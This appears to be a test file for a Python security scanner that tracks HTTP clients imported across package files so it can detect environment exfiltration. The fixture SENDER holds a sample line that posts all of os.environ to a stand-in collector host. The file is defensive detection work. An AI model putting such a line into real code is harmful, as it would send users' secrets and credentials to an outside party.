"""An HTTP client made in one file of a package and used to send from another
(`analysis/python/flows/imported_clients.py`)."""

from __future__ import annotations

from pathlib import Path

from cordon_scanner import Scanner
from cordon_scanner.analysis.python.flows.imported_clients import ImportedClients
from cordon_scanner.analysis.python.pyast import PythonAnalyzer
from cordon_scanner.foundation.config.settings import Config

MAKER = "import httpx\nsession = httpx.Client(timeout=10)\n_private = httpx.Client()\n"
SENDER = (
    "import os\nfrom .imports import *\n"
    "def run():\n"
    "    session.post('https://collector.example.invalid/u', json=dict(os.environ))\n"
    "run()\n"
)


class TestWhichNamesAFileTakes:
    def test_a_star_import_takes_the_public_clients(self) -> None:
        found = ImportedClients.of({"pkg/imports.py": MAKER, "pkg/entry.py": SENDER})
        assert found == {"pkg/entry.py": {"session": "httpx.Client"}}

    def test_a_named_import_an_alias_and_an_absolute_path(self) -> None:
        found = ImportedClients.of(
            {
                "src/pkg/net.py": "import requests as rq\nS = rq.Session()\n",
                "src/pkg/a.py": "from .net import S as client\n",
                "src/pkg/b.py": "from pkg.net import S\n",
            }
        )
        assert found == {
            "src/pkg/a.py": {"client": "requests.Session"},
            "src/pkg/b.py": {"S": "requests.Session"},
        }

    def test_a_re_export_is_followed(self) -> None:
        found = ImportedClients.of(
            {
                "p/imports.py": MAKER,
                "p/__init__.py": "from .imports import session\n",
                "p/entry.py": "from . import session\n",
            }
        )
        assert found["p/entry.py"] == {"session": "httpx.Client"}

    def test_what_is_not_a_client_or_not_in_the_package_binds_nothing(self) -> None:
        assert not ImportedClients.of(
            {
                "p/conf.py": "import httpx\nTIMEOUT = 10\nLIMITS = httpx.Limits()\n",
                "p/entry.py": "from .conf import *\nfrom .missing import session\nfrom httpx import Client\n",
            }
        )

    def test_a_name_the_file_binds_itself_keeps_its_own_meaning(self) -> None:
        found = ImportedClients.of(
            {"p/imports.py": MAKER, "p/entry.py": "from .imports import *\nsession = object()\n"}
        )
        assert not found

    def test_a_file_that_will_not_parse_is_skipped(self) -> None:
        assert not ImportedClients.of({"p/imports.py": "session = (", "p/entry.py": SENDER})


class TestTheAnalyserSendsThroughAnImportedClient:
    @staticmethod
    def sent(source: str, clients: dict[str, str] | None) -> list[str]:
        return [
            h.detail
            for h in PythonAnalyzer.analyse(source, imported_clients=clients)
            if h.detail.startswith(("identity sent", "environment sent", "secret sent"))
        ]

    def test_the_environment_sent_through_it_is_seen(self) -> None:
        assert not self.sent(SENDER, None)
        assert self.sent(SENDER, {"session": "httpx.Client"})

    def test_a_request_carrying_nothing_sensitive_raises_nothing(self) -> None:
        source = (
            "from .imports import session\nsession.get('https://api.example.invalid/v1/items')\n"
        )
        assert not self.sent(source, {"session": "httpx.Client"})


class TestAPackageScan:
    @staticmethod
    def rules(root: Path) -> set[tuple[str, str]]:
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(root)
        return {(f.rule_id, f.location.path.rsplit("/", 1)[-1]) for f in result.findings}

    def test_the_split_sender_is_found_in_a_scanned_package(self, tmp_path: Path) -> None:
        pkg = tmp_path / "pkg"
        pkg.mkdir()
        (pkg / "__init__.py").write_text("from . import entry\n", encoding="utf-8")
        (pkg / "imports.py").write_text(MAKER, encoding="utf-8")
        (pkg / "entry.py").write_text(SENDER, encoding="utf-8")
        assert ("SUSPECT.EXFIL.ENVIRONMENT.001", "entry.py") in self.rules(tmp_path)
